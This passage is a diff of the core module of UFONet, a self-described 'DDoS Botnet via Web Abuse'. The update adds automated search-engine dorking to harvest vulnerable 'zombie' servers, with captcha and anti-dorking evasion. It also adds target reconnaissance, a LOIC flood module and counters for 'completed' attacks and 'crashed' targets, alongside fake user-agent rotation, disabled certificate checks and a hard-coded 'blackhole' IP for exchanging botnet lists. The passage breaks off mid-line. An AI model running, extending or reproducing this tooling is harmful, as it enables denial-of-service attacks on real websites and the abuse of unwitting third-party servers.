@@ -1,14 +1,14 @@
 #!/usr/bin/env python 
 # -*- coding: utf-8 -*-"
 """
-UFONet - DDoS Botnet via Web Abuse - 2013/2014/2015/2016 - by psy (epsylon@riseup.net)
+UFONet - DDoS Botnet via Web Abuse - 2013/2014/2015/2016/2017 - by psy (epsylon@riseup.net)
 
 You should have received a copy of the GNU General Public License along
 with UFONet; if not, write to the Free Software Foundation, Inc., 51
 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
 """
 import os, sys, re, traceback, random, time, threading, base64, socket, httplib, ssl, requests, string
-import StringIO, urllib, urllib2, cgi
+import StringIO, urllib, urllib2, cgi, json
 from urlparse import urlparse
 from random import randrange, shuffle
 from options import UFONetOptions
@@ -17,100 +17,22 @@ from herd import Herd
 from zombie import Zombie
 from doll import Doll
 from inspector import Inspector
+from abductor import Abductor
+from loic import LOIC
 
 DEBUG = 0
 
 class UFONet(object):
     def __init__(self):
         self.blackhole = '176.28.23.46' # default download/upload zombies 'blackhole'
-        self.mothership_ids = [] # generating name/id for your mothership ;-)
-        self.mothership_ids.append(base64.urlsafe_b64encode('avalon'))
-        self.mothership_ids.append(base64.urlsafe_b64encode('cruiser'))
-        self.mothership_ids.append(base64.urlsafe_b64encode('darkstar'))
-        self.mothership_ids.append(base64.urlsafe_b64encode('morgana'))
-        self.mothership_ids.append(base64.urlsafe_b64encode('sweetcandy'))
-        self.mothership_ids.append(base64.urlsafe_b64encode('io'))
-        self.mothership_ids.append(base64.urlsafe_b64encode('lain'))
-        self.mothership_ids.append(base64.urlsafe_b64encode('manhattan'))
-        self.mothership_ids.append(base64.urlsafe_b64encode('skywalker'))
-        self.mothership_ids.append(base64.urlsafe_b64encode('defender'))
-        self.mothership_ids.append(base64.urlsafe_b64encode('mp19'))
-        self.mothership_ids.append(base64.urlsafe_b64encode('casiopea'))
-        self.mothership_ids.append(base64.urlsafe_b64encode('orion'))
-        self.mothership_ids.append(base64.urlsafe_b64encode('pluto'))
-        self.mothership_ids.append(base64.urlsafe_b64encode('iku'))
-        self.mothership_ids.append(base64.urlsafe_b64encode('cosmic banana'))
-        self.mothership_ids.append(base64.urlsafe_b64encode('lucio'))
-        self.mothership_ids.append(base64.urlsafe_b64encode('gladio'))
-        self.mothership_ids.append(base64.urlsafe_b64encode('scala'))
-        self.mothership_ids.append(base64.urlsafe_b64encode('marauder'))
-        self.mothership_ids.append(base64.urlsafe_b64encode('saturn'))
-        self.mothership_ids.append(base64.urlsafe_b64encode('pulse'))
-        self.mothership_ids.append(base64.urlsafe_b64encode('gamma ray'))
-        self.mothership_ids.append(base64.urlsafe_b64encode('leviathan'))
-        self.mothership_ids.append(base64.urlsafe_b64encode('irkä'))
-        self.mothership_ids.append(base64.urlsafe_b64encode('hale bopp'))
-        self.mothership_ids.append(base64.urlsafe_b64encode('KIC8462852'))
-        self.mothership_ids.append(base64.urlsafe_b64encode('cygnus'))
-        self.mothership_ids.append(base64.urlsafe_b64encode('lyra'))
-        self.mothership_ids.append(base64.urlsafe_b64encode('space riot'))
-        self.mothership_ids.append(base64.urlsafe_b64encode('nexus'))
-        self.mothership_ids.append(base64.urlsafe_b64encode('gotomah'))
-        self.mothership_ids.append(base64.urlsafe_b64encode('planet squater'))
-        self.mothership_ids.append(base64.urlsafe_b64encode('tyranna'))
-        self.mothership_ids.append(base64.urlsafe_b64encode('CTB37A'))
-        self.mothership_id = random.choice(self.mothership_ids).strip()
-        self.mothership_hash = random.getrandbits(128) # generating random evasion hash 
-        self.search_engines = [] # available dorking search engines
-        #self.search_engines.append('duck') [09/08/2016: deprecated! -> duck has removed 'inurl' operator]
-        self.search_engines.append('bing')
-        self.search_engines.append('yahoo')
-        #self.search_engines.append('google') # [09/08/2016: modified -> not working from TOR]
-        #self.search_engines.append('yandex') [09/08/2016: deprecated! -> yandex has introduced captcha]
-        self.agents = [] # user-agents
-        self.agents.append('Mozilla/5.0 (iPhone; U; CPU iOS 2_0 like Mac OS X; en-us)')
-        self.agents.append('Mozilla/5.0 (Linux; U; Android 0.5; en-us)')
-        self.agents.append('Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)')
-        self.agents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)')
-        self.agents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/525.13 (KHTML, like Gecko) Chrome/0.2.149.29 Safari/525.13')
-        self.agents.append('Opera/9.25 (Windows NT 6.0; U; en)')
-        self.agents.append('Mozilla/2.02E (Win95; U)')
-        self.agents.append('Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)')
-        self.agents.append('Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)')
-        self.agents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; de; rv:1.9.2.3) Gecko/20100401 Firefox/3.6.3 (FM Scene 4.6.1)')
-        self.agents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; de; rv:1.9.2.3) Gecko/20100401 Firefox/3.6.3 (.NET CLR 3.5.30729) (Prevx 3.0.5)')
-        self.agents.append('Privoxy/1.0')
-        self.agents.append('CERN-LineMode/2.15')
-        self.agents.append('cg-eye interactive')
-        self.agents.append('China Local Browser 2.6')
-        self.agents.append('ClariaBot/1.0')
-        self.agents.append('Comos/0.9_(robot@xyleme.com)')
-        self.agents.append('Crawler@alexa.com')
-        self.agents.append('DonutP; Windows98SE')
-        self.agents.append('Dr.Web (R) online scanner: http://online.drweb.com/')
-        self.agents.append('Dragonfly File Reader')
-        self.agents.append('Eurobot/1.0 (http://www.ayell.eu)')
-        self.agents.append('FARK.com link verifier')
-        self.agents.append('FavIconizer')
-        self.agents.append('Feliz - Mixcat Crawler (+http://mixcat.com)')
-        self.agents.append('TwitterBot (http://www.twitter.com)')
-        self.agents.append('DataCha0s/2.0')
-        self.agents.append('EvaalSE - bot@evaal.com')
-        self.agents.append('Feedfetcher-Google; (+http://www.google.com/feedfetcher.html)')
-        self.agents.append('archive.org_bot')
-        self.agents.append('Mozilla/5.0 (compatible; Konqueror/4.5; FreeBSD) KHTML/4.5.4 (like Gecko)')
-        self.agents.append('myibrow/2.2 (Windows; U; Windows NT 5.1; cs; rv:1.8.1.14) Gecko/20080001 My Internet Browser/2.2.0.0 20080913235045')
-        self.agents.append('Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:5.0) Whistler/20110021 myibrow/5.0.0.0')
-        self.agents.append('Mozilla/4.08 [en] (WinNT; I ;Nav)')
-        self.agents.append('Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Oupeng/10.2.1.86910 Safari/534.30')
-        self.agents.append('Mozilla/5.0 (SMART-TV; Linux; Tizen 2.3) AppleWebkit/538.1 (KHTML, like Gecko) SamsungBrowser/1.0 Safari/538.1')
-        self.user_agent = random.choice(self.agents).strip()
+        self.agents_file = 'core/txt/user-agents.txt' # set source path to retrieve user-agents
+        self.motherships_file = 'core/txt/motherships.txt' # set source path to retrieve mothership names
         self.zombies_file = 'botnet/zombies.txt' # set source path to retrieve 'zombies'
         self.aliens_file = 'botnet/aliens.txt' # set source path to retrieve 'aliens'
         self.droids_file = 'botnet/droids.txt' # set source path to retrieve 'droids'
         self.ucavs_file = 'botnet/ucavs.txt' # set source path to retrieve 'ucavs'
         self.rpcs_file = 'botnet/rpcs.txt' # set source path to retrieve 'rpcs'
-        self.mothership_stats_file = 'stats.json' # set source for mothership stats
+        self.mothership_stats_file = 'core/json/stats.json' # set source for mothership stats
         self.referer = 'http://127.0.0.1/'
         self.head = False
         self.payload = False
@@ -139,6 +61,9 @@ class UFONet(object):
         self.ctx = ssl.create_default_context() # creating context to bypass SSL cert validation (black magic)
         self.ctx.check_hostname = False
         self.ctx.verify_mode = ssl.CERT_NONE
+        self.nat_error_flag = "OFF"
+        self.trans_zombies = 0
+        self.scanned_zombies = 0
 
     def create_options(self, args=None):
         self.optionParser = UFONetOptions()
@@ -146,6 +71,24 @@ class UFONet(object):
         if not self.options:
             return False
         return self.options
+
+    def banner_welcome(self):
+        print "                                             0========================================0"
+        print "                '' '----' ''                 ||                                      ||"   
+        print "             .'_.- (    ) -._'.              ||  * Class: UFONet -ViPR404-           ||"
+        print "           .'.'    |'..'|    '.'.            ||                                      ||"
+        print "    .-.  .' /'--.__|____|__.--'\ '.  .-.     ||  * Type: Scout/Transporter           ||"
+        print "   (O).)-| |  \    |    |    /  | |-(.(O)    ||                                      ||"
+        print "    `-'  '-'-._'-./      \.-'_.-'-'  `-'     ||  * Botnet (featured):                ||"
+        print "       _ | |   '-.________.-'   | | _        ||                                      ||"
+        print "    .' _ | |     |   __   |     | | _ '.     ||    -Zombies: HTTP GET bots           ||"
+        print "   / .' ''.|     | /    \ |     |.'' '. \    ||    -Droids : HTTP GET (+params) bots ||"
+        print "   | |( )| '.    ||      ||    .' |( )| |    ||    -Aliens : HTTP POST bots          ||"
+        print "   \ '._.'   '.  | \    / |  .'   '._.' /    ||    -UCAVs  : Web Abusing bots        ||"
+        print "    '.__ ______'.|__'--'__|.'______ __.'     ||    -X-RPCs : XML-RPC bots            ||"
+        print "   .'_.-|                          |-._'.    ||                                      ||"                                         
+        print "                                             0|======================================|0" 
+        print ""
 
     def banner(self):
         print '='*75, "\n"
@@ -170,6 +113,28 @@ class UFONet(object):
             if DEBUG:
                 traceback.print_exc()
 
+    def start_ship_engine(self):
+        self.agents = [] # generating available user-agents
+        f = open(self.agents_file)
+        agents = f.readlines()
+        f.close()
+        for agent in agents:
+            self.agents.append(agent)
+        self.user_agent = random.choice(self.agents).strip()
+        self.search_engines = [] # available dorking search engines
+        self.search_engines.append('bing') # [27/06/2017: OK!]
+        self.search_engines.append('yahoo') # [27/06/2017: OK!]
+        self.search_engines.append('yandex') # [27/06/2017: OK! + captcha discovering]
+        #self.search_engines.append('duck') [09/08/2016: deprecated! -> duck has removed 'inurl' operator]
+        #self.search_engines.append('google') # [09/08/2016: modified -> not working from TOR]
+
+        if not os.path.exists("core/json/"): # create gui json cfg files folder
+            os.mkdir("core/json/")
+        self.banner_welcome()
+        self.update_flying_stats() # update flying time stats
+        chargo = self.check_mothership_chargo() # check mothership chargo
+        self.update_max_chargo(int(chargo)) # update max chargo stats
+
     def run(self, opts=None):
         if opts:
             self.create_options(opts)
@@ -179,6 +144,9 @@ class UFONet(object):
         if not self.options.threads:
             self.options.threads=5 # default number of threads
         self.sem = threading.Semaphore(self.options.threads)
+
+        # start ship engine
+        self.start_ship_engine()
 
         # check proxy options
         proxy = options.proxy
@@ -293,6 +261,7 @@ class UFONet(object):
                     print "\nBye!\n"
                 else:
                     test = self.testing(zombies)
+                self.update_missions_stats() # update mothership missions stats
             except Exception:
                 print ("[Error] - Something wrong searching using: "+engine+"\n")
 
@@ -349,8 +318,60 @@ class UFONet(object):
                     print "\nBye!\n"
                 else:
                     test = self.testing(zombies)
+                self.update_missions_stats() # update mothership missions stats
             except Exception:
                 print ("[Error] - Something wrong searching using: "+engine+"\n")
+
+        # auto-search for 'zombies' (dorks+all_engines+time -> to discover max new zombies)
+        if options.autosearch:
+            try:
+                self.banner()
+                print "\nSearching automatically for 'zombies' (WARNING: this may take several time!)\n" 
+                print "[Info] Try to use CTRL+z (on shell) to STOP IT! ;-)\n"
+                print "[Info] REMEMBER: Results are saved at the end of the whole process. Be patient...\n"
+                print '-'*25 + "\n"
+                stop_flag = False # use a flag to establish an end
+                zombies_found = []
+                engines_list = self.search_engines
+                while stop_flag == False:
+                    for e in engines_list:
+                        zombies_counter = 0 # use it also as (engine) flag
+                        engine = e
+                        self.options.engine = engine
+                        print("Searching for NEW 'zombies' (not present on your list) using: "+engine+'\n')
+                        dorks = self.extract_dorks()
+                        if not dorks:
+                            return
+                        for dork in dorks:
+                            print '='*22
+                            print "Dork:", dork
+                            print '='*22 + '\n'
+                            dorked_zombies = self.search_zombies(dork)
+                            for zombie in dorked_zombies:
+                                if zombie not in zombies_found: # evade repetitions for zombies found
+                                    zombies_found.append(zombie)
+                                    zombies_counter = zombies_counter + 1                   
+                        if zombies_counter == 0:
+                            print "[Info] - No more NEW victims found (by the moment) using: "+engine+"... Let's remove it from queue!\n"
+                            engines_list.remove(engine) # remove not more results engine from search engines list
+                            if not engines_list: # if search engines empty, call return-exit routine
+                               print "[Info] - Search engines aren't providing more results... Let's exit! ;-)\n"
+                               stop_flag = True # exit flag up
+                print '='*44
+                print "\nTotal zombies (auto)found:", len(zombies_found), "\n"
+                print '='*44 + '\n'
+                if not self.options.forceyes:
+                    check_url_link_reply = raw_input("Wanna check if they are valid zombies? (Y/n)\n")
+                    print '-'*25
+                else:
+                    check_url_link_reply = "Y"
+                if check_url_link_reply == "n" or check_url_link_reply == "N":
+                    print "\nBye!\n"
+                else:
+                    test = self.testing(zombies_found)
+                self.update_missions_stats() # update mothership missions stats
+            except Exception:
+                print ("[Error] - Something wrong (auto)searching...\n")
 
         # test web 'zombie' servers -> show statistics
         if options.test: 
@@ -360,6 +381,7 @@ class UFONet(object):
                 if not zombies:
                     return
                 test = self.testing(zombies)
+                self.update_missions_stats() # update mothership missions stats
             except Exception:
                 print ("\n[Error] - Something wrong testing!\n")
                 traceback.print_exc()
@@ -372,6 +394,7 @@ class UFONet(object):
                 if not rpcs:
                     return
                 testrpc = self.testing_rpcs(rpcs)
+                self.update_missions_stats() # update mothership missions stats
             except Exception:
                 print ("\n[Error] - Something wrong testing XML-RPC servers!\n")
                 traceback.print_exc()
@@ -384,6 +407,7 @@ class UFONet(object):
                 if not zombies:
                     return
                 attack = self.attacking(zombies)
+                self.update_missions_stats() # update mothership missions stats
             except Exception:
                 print ("\n[Error] - Something wrong attacking!\n")
                 traceback.print_exc()
@@ -396,9 +420,24 @@ class UFONet(object):
                 print '='*22 + '\n'
                 self.instance = Inspector(self) # instance main class for inspection operations
                 inspection = self.instance.inspecting(options.inspect)
+                self.update_missions_stats() # update mothership missions stats
             except Exception, e:
                 traceback.print_exc()
                 print ("\n[Error] - Something wrong inspecting... Not any object found!\n")
+                return #sys.exit(2)
+
+        # abduct target -> examine target's webserver configuration (banner grabbing, anti-ddos, etc.)
+        if options.abduction:
+            try:
+                self.banner()
+                print("\nAbducting target to extract interesting information... Be patient!\n")
+                print '='*22 + '\n'
+                self.instance = Abductor(self) # instance main class for abduction operations
+                abduction = self.instance.abducting(options.abduction)
+                self.update_missions_stats() # update mothership missions stats
+            except Exception, e:
+                traceback.print_exc()
+                print ("\n[Error] - Something wrong abducting... Not any data stream found!\n")
                 return #sys.exit(2)
 
         # attack me -> exploit Open Redirect massively and connect all vulnerable servers to master for benchmarking
@@ -409,24 +448,32 @@ class UFONet(object):
                 print("[Warning] You are going to reveal your real IP to your zombies...\n")
                 if not self.options.forceyes:
                     update_reply = raw_input("Wanna continue (Y/n)")
-                    print '-'*25
                 else:
                     update_reply = "Y"
                 if update_reply == "n" or update_reply == "N":
                     print "\n[Info] Aborting 'Attack-Me' test... Bye!\n"
                     return
-                print '='*22
-                print("Mothership ID: " + str(base64.b64decode(self.mothership_id))) + " | RND: " + str(self.mothership_hash)
+                self.mothership_ids = [] # generating name/id for your mothership ;-)
+                f = open(self.motherships_file)
+                motherships = f.readlines()
+                f.close()
+                for ship in motherships:
+                    self.mothership_ids.append(base64.urlsafe_b64encode(ship))
+                self.mothership_id = str(base64.b64decode(random.choice(self.mothership_ids).strip()))
+                self.mothership_hash = str(random.getrandbits(128)) # generating random evasion hash  
+                print "\nMothership ID: " + self.mothership_id + "RND: " + self.mothership_hash
                 f = open("alien", "w") # generate random alien worker
                 f.write(str(self.mothership_hash))
                 f.close()
-                print '='*22 + '\n'
-                print("Checking NAT/IP configuration:\n")
+                print("\nChecking NAT/IP configuration:\n")
                 nat = self.check_nat()
+                if self.nat_error_flag == "ON":
+                    return
                 zombies = self.extract_zombies()
                 if not zombies:
                     return
                 attackme = self.attackme(zombies)
+                self.update_missions_stats() # update mothership missions stats
             except Exception, e:
                 traceback.print_exc()
                 print ("\n[Error] - Something wrong redirecting 'zombies' against you...\n")
@@ -493,7 +540,7 @@ class UFONet(object):
                 print '='*22 + '\n'
                 download_list = self.downloading_list()
             except Exception, e:
-                print ("[Error] - Something wrong downloading!\n"+str(e))
+                print ("[Error] - Something wrong downloading!\n")
                 return #sys.exit(2)
 
         # upload list of 'zombies' to a 'blackhole' IP
@@ -546,34 +593,150 @@ class UFONet(object):
         opener = urllib2.build_opener(proxy)
         urllib2.install_opener(opener)
 
-    def update_mothership_stats(self):
-        import json
-        if not os.path.exists(self.mothership_stats_file) == True: # create data when no stats file
+    def check_mothership_chargo(self):
+        f = open(self.zombies_file)
+        self.zombies = f.readlines()
+        self.zombies = [zombie.replace('\n', '') for zombie in self.zombies]
+        self.list_zombies = []
+        for zombie in self.zombies:
+            t = urlparse(zombie)
+            name_zombie = t.netloc
+            self.list_zombies.append(name_zombie)
+        self.num_zombies = str(len(self.zombies))
+        f.close()
+        f = open(self.aliens_file)
+        self.aliens = f.readlines()
+        self.aliens = [alien.replace('\n', '') for alien in self.aliens]
+        self.list_aliens = []
+        for alien in self.aliens:
+            t = urlparse(alien)
+            name_alien = t.netloc
+            self.list_aliens.append(name_alien)
+        self.num_aliens = str(len(self.aliens))
+        f.close()
+        f = open(self.droids_file)
+        self.droids = f.readlines()
+        self.droids = [droid.replace('\n', '') for droid in self.droids]
+        self.list_droids = []
+        for droid in self.droids:
+            t = urlparse(droid)
+            name_droid = t.netloc
+            self.list_droids.append(name_droid)
+        self.num_droids = str(len(self.droids))
+        f.close()
+        f = open(self.ucavs_file)
+        self.ucavs = f.readlines()
+        self.ucavs = [ucav.replace('\n', '') for ucav in self.ucavs]
+        self.list_ucavs = []
+        for ucav in self.ucavs:
+            t = urlparse(ucav)
+            name_ucav = t.netloc
+            self.list_ucavs.append(name_ucav)
+        self.num_ucavs = str(len(self.ucavs))
+        f.close()
+        f = open(self.rpcs_file)
+        self.rpcs = f.readlines()
+        self.rpcs = [rpc.replace('\n', '') for rpc in self.rpcs]
+        self.list_rpcs = []
+        for rpc in self.rpcs:
+            t = urlparse(rpc)
+            name_rpc = t.netloc
+            self.list_rpcs.append(name_rpc)
+        self.num_rpcs = str(len(self.rpcs))
+        f.close()
+        self.total_botnet = str(int(self.num_zombies) + int(self.num_aliens) + int(self.num_droids) + int(self.num_ucavs) + int(self.num_rpcs))
+        return self.total_botnet
+
+    def update_flying_stats(self):
+        if not os.path.exists(self.mothership_stats_file) == True: # create data when no stats file (first time used)
             with open(self.mothership_stats_file, "w") as f:
-                json.dump({"completed": "0", "crashed": "0"}, f, indent=4) # starting reset
+                json.dump({"flying": "0", "missions": "0", "scanner": "0", "transferred": "0", "max_chargo": "0", "completed": "0", "loic": "0", "crashed": "0"}, f, indent=4) # starting reset
+        stats_json_file = open(self.mothership_stats_file, "r")
+        data = json.load(stats_json_file)
+        stats_json_file.close()
+        aflying = data["flying"]
+        aflying = str(int(aflying) + 1) # add new flying time
+        data["flying"] = aflying
+        stats_json_file = open(self.mothership_stats_file, "w+")
+        stats_json_file.write(json.dumps(data))
+        stats_json_file.close()
+
+    def update_mothership_stats(self):
         stats_json_file = open(self.mothership_stats_file, "r")
         data = json.load(stats_json_file)
         stats_json_file.close()
         acompleted = data["completed"]
         acompleted = str(int(acompleted) + 1) # add new completed attack
         data["completed"] = acompleted
-        tcrashed = data["crashed"]
         stats_json_file = open(self.mothership_stats_file, "w+")
         stats_json_file.write(json.dumps(data))
         stats_json_file.close()
 
     def update_targets_crashed(self):
-        import json
-        if not os.path.exists(self.mothership_stats_file) == True: # create data when no stats file
-            with open(self.mothership_stats_file, "w") as f:
-                json.dump({"completed": "0", "crashed": "0"}, f, indent=4) # starting reset
         stats_json_file = open(self.mothership_stats_file, "r")
         data = json.load(stats_json_file)
         stats_json_file.close()
-        acompleted = data["completed"]
         tcrashed = data["crashed"]
         tcrashed = str(int(tcrashed) + 1) # add new crashed target
         data["crashed"] = tcrashed
+        stats_json_file = open(self.mothership_stats_file, "w+")
+        stats_json_file.write(json.dumps(data))
+        stats_json_file.close()
+
+    def update_missions_stats(self):
+        stats_json_file = open(self.mothership_stats_file, "r")
+        data = json.load(stats_json_file)
+        stats_json_file.close()
+        missions = data["missions"]
+        missions = str(int(missions) + 1) # add new mission target
+        data["missions"] = missions
+        stats_json_file = open(self.mothership_stats_file, "w+")
+        stats_json_file.write(json.dumps(data))
+        stats_json_file.close()
+
+    def update_scanner_stats(self, num):
+        stats_json_file = open(self.mothership_stats_file, "r")
+        data = json.load(stats_json_file)
+        stats_json_file.close()
+        scanner = data["scanner"]
+        scanner = str(int(scanner) + int(num)) # add new zombies found by dorking to mothership stats
+        data["scanner"] = scanner
+        stats_json_file = open(self.mothership_stats_file, "w+")
+        stats_json_file.write(json.dumps(data))
+        stats_json_file.close()
+
+    def update_transferred_stats(self, num):
+        stats_json_file = open(self.mothership_stats_file, "r")
+        data = json.load(stats_json_file)
+        stats_json_file.close()
+        transferred = data["transferred"]
+        transferred = str(int(transferred) + int(num)) # add new zombies found by downloading via blackholes to mothership stats
+        data["transferred"] = transferred
+        stats_json_file = open(self.mothership_stats_file, "w+")
+        stats_json_file.write(json.dumps(data))
+        stats_json_file.close()
+
+    def update_max_chargo(self, chargo):
+        stats_json_file = open(self.mothership_stats_file, "r")
+        data = json.load(stats_json_file)
+        stats_json_file.close()
+        amax_chargo = data["max_chargo"]
+        if int(chargo) > int(amax_chargo): # new max chargo found
+            amax_chargo = chargo # add new max chargo
+        else:
+            amax_chargo = data["max_chargo"]
+        data["max_chargo"] = amax_chargo
+        stats_json_file = open(self.mothership_stats_file, "w+")
+        stats_json_file.write(json.dumps(data))
+        stats_json_file.close()
+
+    def update_loic_stats(self):
+        stats_json_file = open(self.mothership_stats_file, "r")
+        data = json.load(stats_json_file)
+        stats_json_file.close()
+        aloic = data["loic"]
+        aloic = str(int(aloic) + 1) # add new loic attack
+        data["loic"] = aloic
         stats_json_file = open(self.mothership_stats_file, "w+")
         stats_json_file.write(json.dumps(data))
         stats_json_file.close()
@@ -1063,6 +1226,7 @@ class UFONet(object):
             self.update_rpcs(rpcs_ready)
             os.remove('reflectors.txt') # remove reflectors .txt file
             print "\n[Info] - Botnet updated! ;-)\n"
+            self.update_transferred_stats(self.trans_zombies) # update json file with transferred stats (blackhole)
 
     def create_web_interface(self):
         # launch webserver+gui
@@ -1153,14 +1317,13 @@ class UFONet(object):
         #    regex = '<a class="result__url" href="(.+?)"' # regex magics [05/08/2016]
         #    pattern = re.compile(regex)
         #    url_links = re.findall(pattern, req_reply)
-
-        if not options.engine or options.engine == 'bing': # using bing by default [05/08/2016: OK!]
+        if not options.engine or options.engine == 'bing': # using bing by default [27/06/2017: OK!]
             if not options.engine:
                 options.engine = 'bing'
             url = 'https://www.bing.com/search?'
             if options.search: # search from query
                 q = 'instreamset:(url):"' + str(options.search) + '"' # set query to search literally on results
-            if options.dorks: # search from a dork
+            if options.dorks or options.autosearch: # search from a dork
                 q = 'instreamset:(url):"' + str(dork) + '"' # set query from a dork to search literally on results
             start = 0 # set index number of first entry
             query_string = { 'q':q, 'first':start }
@@ -1175,9 +1338,9 @@ class UFONet(object):
                 req_reply = urllib2.urlopen(req).read()
             except:
                 print('[Error] - Unable to connect to bing\n')
-                if options.allengines:
+                if options.allengines or options.autosearch:
                     return
-                if not options.dorks:
+                if not options.dorks or not options.autosearch:
                     if not self.options.forceyes:
                         update_reply = raw_input("Wanna try a different search engine (Y/n)")
                     else:
@@ -1196,7 +1359,6 @@ class UFONet(object):
             regex = '<li class="b_algo"><h2><a href="(.+?)">' # regex magics
             pattern = re.compile(regex)
             url_links = re.findall(pattern, req_reply)
-
         #elif options.engine == 'google': # google [07/10/2015: OK!] [09/08/2016: not working from TOR]
         #    url = 'https://www.google.com/xhtml?'
         #    if options.search: # search from query
@@ -1246,15 +1408,14 @@ class UFONet(object):
         #    regex = '<h3 class="r"><a href="/url(.+?)">' # regex magics
         #    pattern = re.compile(regex)
         #    url_links = re.findall(pattern, req_reply)
-
-        elif options.engine == 'yahoo': # yahoo [18/08/2015: OK!]
+        elif options.engine == 'yahoo': # yahoo [27/06/2017: OK!]
             #location = ['fr', 'de', 'es', 'nl', 'it', 'se', 'ch', 'jp', 'ru', 'lt'] # generate 'flags' for location servers to evade Yahoo anti-dorking on main search webpage [grey magic: 18/08/2016]
             location = ['fr', 'de', 'es', 'nl', 'se', 'ch', 'ru'] # [08/04/2017]
             location = str(random.choice(location).strip()) # suffle location
             url = 'https://'+location+'.search.yahoo.com/search?'
             if options.search: # search from query
                 q = 'instreamset:(url):"' + str(options.search) + '"' # set query to search literally on results
-            if options.dorks: # search from a dork
+            if options.dorks or options.autosearch: # search from a dork
                 q = 'instreamset:(url):"' + str(dork) + '"' # set query from a dork to search literally on results
             start = 0 # set index number of first entry
             query_string = { 'p':q, 'b':start }
@@ -1269,9 +1430,9 @@ class UFONet(object):
                 req_reply = urllib2.urlopen(req).read()
             except:
                 print('[Error] - Unable to connect to yahoo\n')
-                if options.allengines:
+                if options.allengines or options.autosearch:
                     return
-                if not options.dorks:
+                if not options.dorks or not options.autosearch:
                     if not self.options.forceyes:
                         update_reply = raw_input("Wanna try a different search engine (Y/n)")
                     else:
@@ -1291,51 +1452,56 @@ class UFONet(object):
             regex = 'href="(.+?)" target="_blank" data' # regex magics [08/04/2017]
             pattern = re.compile(regex)
             url_links = re.findall(pattern, req_reply)
-
-        #elif options.engine == 'yandex': # yandex [07/10/2015: OK!] [09/08/2016: deprecated! -> yandex has introduced captcha]
-        #    url = 'https://yandex.ru/search/?'
-        #    if options.search: # search from query
-        #        q = 'inurl:"' + str(options.search) + '"' # set query to search literally on results
-        #    if options.dorks: # search from a dork
-        #        q = 'inurl:"' + str(dork) + '"' # set query from a dork to search literally on results
-        #    start = 0 # set index number of first entry
-        #    query_string = { 'text':q, 'p':start }
-        #    data = urllib.urlencode(query_string)
-        #    url = url + data
-        #    self.user_agent = random.choice(self.agents).strip() # suffle user-agent
-        #    headers = {'User-Agent' : self.user_agent, 'Referer' : self.referer} # set fake user-agent and referer
-        #    if options.verbose:
-        #        print("Query used: " + url + "\n")
-        #    try:
-        #        req = urllib2.Request(url, None, headers)
-        #        req_reply = urllib2.urlopen(req).read()
-        #    except:
-        #        print('[Error] - Unable to connect to yandex\n')
-        #        if options.allengines:
-        #            return
-        #        if not options.dorks:
-        #            if not self.options.forceyes:
-        #                update_reply = raw_input("Wanna try a different search engine (Y/n)")
-        #            else:
-        #                update_reply = "Y"
-        #            if update_reply == "n" or update_reply == "N":
-        #                return #sys.exit(2)
-        #            print "\nSearch engines available:"
-        #            print '-'*25
-        #            for e in self.search_engines:
-        #                print "+ "+e
-        #            print '-'*25
-        #            print "\nEx: ufonet -s 'proxy.php?url=' --se 'bing'"
-        #            return #sys.exit(2)
-        #        else:
-        #            req_reply = ''
-        #    regex = '<a class="link link_cropped_no serp-item__title-link" target="_blank" href="(.+?)"' # regex magics
-        #    pattern = re.compile(regex)
-        #    url_links = re.findall(pattern, req_reply)
-
+        elif options.engine == 'yandex': # yandex [07/10/2015: OK!]
+            url = 'https://yandex.ru/search/?'
+            if options.search: # search from query
+                q = 'inurl:"' + str(options.search) + '"' # set query to search literally on results
+            if options.dorks or options.autosearch: # search from a dork
+                q = 'inurl:"' + str(dork) + '"' # set query from a dork to search literally on results
+            start = 0 # set index number of first entry
+            lr = '213' # [27/06/2017: OK!]
+            query_string = { 'text':q, 'lr':lr, 'p':start }
+            data = urllib.urlencode(query_string)
+            url = url + data
+            self.user_agent = random.choice(self.agents).strip() # suffle user-agent
+            headers = {'User-Agent' : self.user_agent, 'Referer' : self.referer} # set fake user-agent and referer
+            if options.verbose:
+                print("Query used: " + url + "\n")
+            try:
+                req = urllib2.Request(url, None, headers)
+                req_reply = urllib2.urlopen(req).read()
+            except:
+                print('[Error] - Unable to connect to yandex\n')
+                if options.allengines or options.autosearch:
+                    return
+                if not options.dorks or not options.autosearch:
+                    if not self.options.forceyes:
+                        update_reply = raw_input("Wanna try a different search engine (Y/n)")
+                    else:
+                        update_reply = "Y"
+                    if update_reply == "n" or update_reply == "N":
+                        return #sys.exit(2)
+                    print "\nSearch engines available:"
+                    print '-'*25
+                    for e in self.search_engines:
+                        print "+ "+e
+                    print '-'*25
+                    print "\nEx: ufonet -s 'proxy.php?url=' --se 'bing'"
+                    return #sys.exit(2)
+                else:
+                    req_reply = ''
+            #regex = '<a class="link link_cropped_no serp-item__title-link" target="_blank" href="(.+?)"' # regex magics
+            if 'captchaSound' in req_reply: # detecting captcha reply
+                print "[Info] - This search engine is asking for a captcha...\n"
+                if options.allengines or options.autosearch:
+                    url_links = "" # keep running!
+            else:
+                regex = 'target="_blank" href="(.+?)" onmousedown="rc' # [27/06/2017] regex magics
+                pattern = re.compile(regex)
+                url_links = re.findall(pattern, req_reply)
         else: # no valid search engine
             print('[Error] - This search engine is not supported!\n')
-            if not options.dorks:
+            if not options.dorks or options.autosearch:
                 if not self.options.forceyes:
                     update_reply = raw_input("Wanna try a different search engine (Y/n)")
                 else:
@@ -1371,12 +1537,15 @@ class UFONet(object):
                     url = url.rsplit('RU=',1)[1] 
                 if '&u=' in url: # regex magics [08/04/2017]
                     url = url.rsplit('&u=',1)[1]  
+            if options.engine == "yandex":
+                if 'rel="' in url: # regex magics [27/06/2017]
+                    url = url.rsplit('rel=',1)[1] 
             total_results = total_results + 1 # results counter
             url_link = url.strip('?q=') # parse url_links to retrieve only a url
             url_link = urllib.unquote(url_link).decode('utf8') # unquote encoding
             if options.search:
                 sep = str(options.search)
-            if options.dorks:
+            if options.dorks or options.autosearch:
